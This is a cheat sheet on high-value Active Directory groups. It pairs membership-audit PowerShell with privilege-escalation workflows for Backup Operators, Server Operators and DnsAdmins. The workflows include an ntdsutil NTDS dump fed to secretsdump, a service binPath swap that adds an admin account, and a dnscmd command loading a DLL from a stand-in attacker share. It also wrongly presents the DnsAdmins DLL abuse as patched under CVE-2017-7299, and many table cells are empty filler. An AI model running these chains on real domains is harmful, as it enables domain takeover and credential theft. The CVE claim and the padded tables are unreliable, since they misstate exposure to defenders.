---
aliases:
  - High-Value Groups
  - DnsAdmins Privesc
  - Backup Operators
  - Privileged Identity Groups
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - Groups Enumeration]]"
---
# AD - Groups Enumeration - High-Value Group Identification

***

## Tier 0 (Forest/Domain Critical)

| **Group** | **Privilege** | **Notas** |
|:---:|:---:|:---:|
| Domain Admins | Full domain control | Top-tier. |
| Enterprise Admins | Forest-wide control | Top-tier (forest root only). |
| Schema Admins | Schema modification | Top-tier (forest root only). |
| Administrators (Built-in) | Per-host admins via auto-add | Top-tier. |
| Cloneable Domain Controllers | DC clone | Tier 0. |
| Account Operators | Account management | Tier 0/1 (excluded from Tier 0 by AdminSDHolder). |
| Backup Operators | NTDS dump path | Tier 0/1 (privesc to DA). |
| Server Operators | Logon DC + service edit | Tier 0/1 (privesc to DA). |
| Print Operators | Driver install (legacy RCE) | Tier 0/1 (legacy). |
| DnsAdmins | DLL plugin (legacy) | Tier 0/1 (pre-CVE-2017-7299). |
| Group Policy Creator Owners | Create new GPOs | Tier 0/1. |
| Replicators | Replication | Tier 0 legacy. |
| Cert Publishers | ADCS NTAuth store | Tier 1+ (ADCS-relevant). |
| Domain Controllers | DC computer accounts | Tier 0. |
| Read-only Domain Controllers | RODCs | Tier 1. |
| Pre-Windows 2000 Compatible Access | Anonymous SAMR | Legacy. |
^ad-hvgroup-tier0

### Tier 0 audit query

```powershell
$tier0 = "Domain Admins","Enterprise Admins","Schema Admins","Administrators",
         "Cloneable Domain Controllers","Account Operators","Backup Operators",
         "Server Operators","Print Operators","DnsAdmins","Group Policy Creator Owners",
         "Replicators","Cert Publishers"

foreach ($g in $tier0) {
  $members = Get-ADGroupMember $g -Recursive -ErrorAction SilentlyContinue
  if ($members) {
    Write-Host "`n=== $g ($(($members | Measure-Object).Count) members) ==="
    $members | Select Name,SamAccountName,ObjectClass | Format-Table -AutoSize
  }
}
```

___

## Backup Operators (NTDS Dump Path)

| **Privilege** | **Detail** | **Notas** |
|:---:|:---:|:---:|
| `SeBackupPrivilege` | Read any file | Standard. |
| `SeRestorePrivilege` | Write any file | Standard. |
| Logon to DC | Standard | Critical. |
| Read NTDS.dit (offline) | Direct DCSync data | Path to DA. |
| Read SAM/SYSTEM hive | Local hash dump | Adjacent. |
| ntdsutil ifm create | Privileged backup creation | Direct path. |
| Volume Shadow Copy | Backup data via VSS | Adjacent. |
| `secretsdump LOCAL` | Offline NTDS dump | Tool. |
| Backup software accounts often here | Audit | Standard. |
| Cross-correlate with computer access | Per-DC | Strategy. |
| BloodHound `CanRDP` + Backup Operators | Lateral path | Adjacent. |
| `diskshadow` native | Adjacent | Adjacent. |
| `NtdsAudit` tool | Defender | Adjacent. |
| Modern hardening: separate backup tier | Best practice | Defense. |
| Detection: NTDS access events | Defender | Adjacent. |
| Privesc workflow: BO → ntdsutil → DCSync | Standard | Standard. |
^ad-hvgroup-backup

### Backup Operators privesc workflow

```cmd
:: As Backup Operators member on DC
:: Step 1: Create backup via ntdsutil
ntdsutil "activate instance ntds" "ifm" "create full c:\ntds_dump" "quit" "quit"

:: Step 2: Copy NTDS.dit + SYSTEM hive offline to attacker
:: Step 3: secretsdump (Linux/attacker)

# Linux:
impacket-secretsdump -ntds c:\ntds_dump\Active Directory\ntds.dit -system c:\ntds_dump\registry\SYSTEM LOCAL

# Output: full NTDS hash dump including krbtgt
```

___

## Server Operators (DC Logon Path)

| **Privilege** | **Detail** | **Notas** |
|:---:|:---:|:---:|
| Logon locally to DC | Standard | Direct. |
| Modify services on DC | Service binPath swap | Privesc path. |
| Modify registry on DC | Indirect | Adjacent. |
| Stop services | Adjacent | Standard. |
| `SeChangeNotifyPrivilege` | Standard | Standard. |
| Cross-correlate with RDP | Lateral | Adjacent. |
| Service binPath modification | Replace binary → SYSTEM | Critical privesc. |
| Workflow: SO → modify svc → restart → SYSTEM | Standard chain | Standard. |
| Detection: service modification events | Defender | Adjacent. |
| Modern: split admin tier | Hardening | Defense. |
| Audit: minimal members | Best practice | Standard. |
| Cross-correlate with Backup Operators | Often same person | Audit. |
| BloodHound CanRDP edge | Visual | Tool. |
| `sc.exe config` modify binPath | Direct | Standard. |
| `reg.exe modify` services key | Adjacent | Standard. |
| WMI service modification | Edge | Adjacent. |
^ad-hvgroup-serverop

### Server Operators privesc

```cmd
:: As Server Operators member on DC
:: Step 1: Modify a service to run attacker payload
sc config <service-name> binPath= "cmd.exe /c net localgroup administrators atacante /add"

:: Step 2: Restart service (running as SYSTEM)
sc stop <service-name>
sc start <service-name>

:: Result: command ran as SYSTEM on DC → DA
```

___

## Account Operators (Account Mgmt)

| **Privilege** | **Detail** | **Notas** |
|:---:|:---:|:---:|
| Create users | Standard | Direct. |
| Modify non-admin users | Standard | Standard. |
| Reset non-admin passwords | Standard | Standard. |
| Disable non-admin accounts | Standard | Standard. |
| Cannot modify Tier 0 (AdminSDHolder protected) | Defense | Standard. |
| `adminCount=1` users protected from AO | Standard | Standard. |
| AO often misused for Tier 1 escalation | Common | Audit. |
| Modify regular service accounts | Adjacent | Common. |
| Reset password on Tier 1 service account | Privesc adjacent | Standard. |
| Cross-correlate with Cert Publishers | ADCS path | Adjacent. |
| Modify SPN on user (without protection) | Targeted Kerberoast | Specific. |
| Add KeyCredentialLink to non-admin | Shadow Credentials | Specific. |
| Detection: bulk user creation | Defender | Adjacent. |
| Modern hardening: split admin tiers | Best practice | Defense. |
| BloodHound AO edges | Modern collection | Tool. |
| Audit: minimal members | Standard | Defense. |
^ad-hvgroup-accountop

### Account Operators capability test

```powershell
# As AO member, test what we can modify
$user = "test_user"

# Reset password
Set-ADAccountPassword -Identity $user -NewPassword (ConvertTo-SecureString "NewPass!" -AsPlainText -Force) -Reset

# Add to group (limited by AdminSDHolder protection)
Add-ADGroupMember -Identity "Group" -Members $user

# Modify SPN (potential targeted Kerberoast)
Set-ADUser -Identity $user -ServicePrincipalNames @{Add="HTTP/fake.dom"}
```

___

## Group Policy Creator Owners

| **Privilege** | **Detail** | **Notas** |
|:---:|:---:|:---:|
| Create new GPOs | Standard | Direct. |
| Modify own GPOs | Default | Standard. |
| Cross-correlate with linked OU | Linking required separately | Standard. |
| GPO link permission separately | Need delegated linking | Multi-step. |
| Adjacent to GPO Abuse hub | Privesc combo | Adjacent. |
| Detection: GPO creation events (4719) | Defender | Adjacent. |
| Audit: minimal members | Best practice | Defense. |
| Modern: split GPO management tier | Hardening | Standard. |
| BloodHound CreatesNewGPO edge | Visual | Tool. |
| `New-GPO` requires this | Standard | Standard. |
| GUID-based GPO references | Standard | Standard. |
| `gPLink` attribute on OU | Linking layer | Adjacent. |
| Combo: create GPO + delegated linking = privesc | Specific | Standard. |
| `Get-GPInheritance` | Adjacent | Adjacent. |
| `Get-GPO -All` | All GPOs | Standard. |
| Per-GPO ACL audit | Granular | Adjacent. |
^ad-hvgroup-gpocreator

___

## DnsAdmins (Legacy CVE-2017-7299)

| **Privilege** | **Detail** | **Notas** |
|:---:|:---:|:---:|
| Manage DNS service | Standard | Standard. |
| Legacy: load DLL plugin via dnscmd | Pre-2017 patch | Critical privesc. |
| `dnscmd /serverlevelplugindll \\attacker\evil.dll` | Privesc command | Privesc. |
| Restart DNS service | Required for DLL load | Adjacent. |
| Result: SYSTEM RCE on DC | Critical | Standard. |
| Patched in 2017 (CVE-2017-7299) | Modern blocked | Standard. |
| Modern: requires local admin on DC | Effectively neutralized | Standard. |
| Audit: empty if no DNS admins | Best practice | Standard. |
| Members in non-DNS context = audit risk | Common audit finding | Audit. |
| Cross-correlate with privilege | Adjacent | Audit. |
| Modern PowerShell DNSServer module | Standard | Standard. |
| Detection: dnscmd execution events | Defender | Adjacent. |
| BloodHound DnsAdmins edge (legacy) | Some support | Tool. |
| Hardening: limit membership | Standard | Defense. |
| Patched but legacy environments still vulnerable | Edge | Critical risk. |
| Test: try dnscmd plugin command | Privesc check | Validation. |
^ad-hvgroup-dnsadmins

### DnsAdmins privesc test (legacy unpatched)

```cmd
:: As DnsAdmins member with reach to DC
:: Test if vulnerable (pre-2017 patch)
dnscmd <DC> /config /serverlevelplugindll \\attacker\evil.dll

:: If successful, restart DNS service on DC
sc stop dns && sc start dns

:: DLL loads as SYSTEM → RCE
:: Modern: command rejected if patch installed
```

___

## Cert Publishers (ADCS Adjacent)

| **Privilege** | **Detail** | **Notas** |
|:---:|:---:|:---:|
| Add CA certificates to NTAuth store | Standard | Adjacent. |
| Modify ADCS configuration (limited) | Edge | Edge. |
| Adjacent to ADCS Abuse hub | ESC8/11/etc | Adjacent. |
| Members: usually CA computer accounts | Standard | Standard. |
| Suspicious user members | Audit | Detection. |
| Cross-correlate with ADCS templates | Per-template ACL | Adjacent. |
| BloodHound ADCS edges | Modern | Tool. |
| Modern hardening: minimal membership | Best practice | Defense. |
| Detection: NTAuth store modification | Defender | Critical event. |
| Pre-ADCS Abuse research: less attention | Now critical | Adjacent. |
| Certipy adjacent | Tool | Adjacent. |
| `certutil -dspublish` | Adjacent | Adjacent. |
| AIA / CDP modification | Edge | Adjacent. |
| Per-CA Manage CA permission | Granular | Adjacent. |
| Cross-trust ADCS | Edge | Adjacent. |
| Audit: minimal user members | Standard | Defense. |
^ad-hvgroup-certpub

___

## Custom Privileged Groups

| **Pattern** | **Detection** | **Notas** |
|:---:|:---:|:---:|
| Custom "Tier 0 Admins" group | Per-org naming | Audit. |
| Custom "DBA" group with DA membership | Common misconfig | Audit. |
| Service ownership groups | Per-service | Standard. |
| Department admin groups | "HR Admins" etc | Audit. |
| Geographic admin groups | "EMEA Admins" | Standard. |
| Application-specific groups | "SAP Admins", "Exchange Admins" | Standard. |
| Helpdesk groups with priv | Common Tier 1 | Audit. |
| Security team groups | "SOC", "IR" | Standard. |
| Compliance audit groups | Read-only typically | Adjacent. |
| Vendor management groups | External access | Audit. |
| Build / DevOps groups | CI/CD privilege | Audit. |
| Cross-correlate with admin Count | Auto-protect signal | Detection. |
| Custom group ACL for privesc | Specific | Audit. |
| Recursive nested into Tier 0 | Hidden privilege | Critical audit. |
| Description with role hints | Free-text | OSINT-clue. |
| BloodHound highvalue tag | Mark manually | Tool. |
^ad-hvgroup-custom

### Custom group analysis

```powershell
# Groups with adminCount=1 (should match SDProp protected list)
Get-ADGroup -Filter {AdminCount -eq 1} | Select Name,SamAccountName,GroupScope

# Suspicious naming patterns
Get-ADGroup -Filter * |
  Where {$_.Name -match "admin|priv|tier0|backup|root|elevated|domain"} |
  Select Name,GroupCategory,GroupScope

# Recursively find groups containing Tier 0
$tier0sids = (Get-ADGroup "Domain Admins").SID,(Get-ADGroup "Enterprise Admins" -Server (Get-ADForest).RootDomain).SID
foreach ($sid in $tier0sids) {
  Get-ADGroup -Filter * -Properties Members |
    Where {$_.Members -contains "CN=$sid,..."}
}
```

***
